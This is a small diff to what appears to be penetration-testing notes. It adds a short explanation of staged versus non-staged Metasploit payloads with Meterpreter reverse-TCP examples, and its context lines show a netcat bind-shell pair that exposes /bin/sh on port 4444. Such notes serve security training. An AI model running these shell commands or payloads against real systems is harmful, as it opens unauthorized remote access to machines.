@@ -187,6 +187,11 @@ Shells
   - Attacker: `nc <ip_victim> 4444`
   - Victim: `nc -lvp 4444 -e /bin/sh`
 
+Payloads
+- Staged: Sends payload in stages, can be less stable
+  - example: `windows/meterpreter/reverse_tcp`
+- Non-staged: Sends exploit all at once, larger in size and won't always work
+  - example: `windows/meterpreter_reverse_tcp`
 
 ## Check-lists
 
